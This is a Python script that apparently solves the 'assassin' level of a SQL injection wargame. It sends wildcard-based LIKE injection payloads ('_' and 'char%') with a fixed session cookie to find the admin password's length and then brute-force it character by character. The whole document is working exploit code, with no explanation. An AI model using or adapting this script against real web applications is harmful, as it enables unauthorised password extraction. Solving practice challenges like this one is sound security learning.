import requests
url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
header={"Cookie":"PHPSESSID=fjvunf0rrrp6027pthmavv7ok2"}
sess=requests.session()

payload="?pw="
for i in range(1,100):
    pay=url+payload+"_"*i
    x=sess.get(pay,headers=header)
    print("check ",i,end=" ")
    if ("Hello admin" in x.text) or ("Hello guest" in x.text):
        length=i
        print("success\nLength:",length)
        break
    else:
        print("failed")
password=''
wordlist="qwertyuiop1234567890asdfghjklzxcvbnm"
for i in range(1,length+1):
    flag=0
    for j in wordlist:
        pay=url+payload+"_"*(i-1)+j+"%"
        x=sess.get(pay,headers=header)
        if "Hello admin" in x.text:
            password+=j
            flag=1
            print("Place ",i,": ",j)
            break
    if not flag:
        password+='_'
print(password)

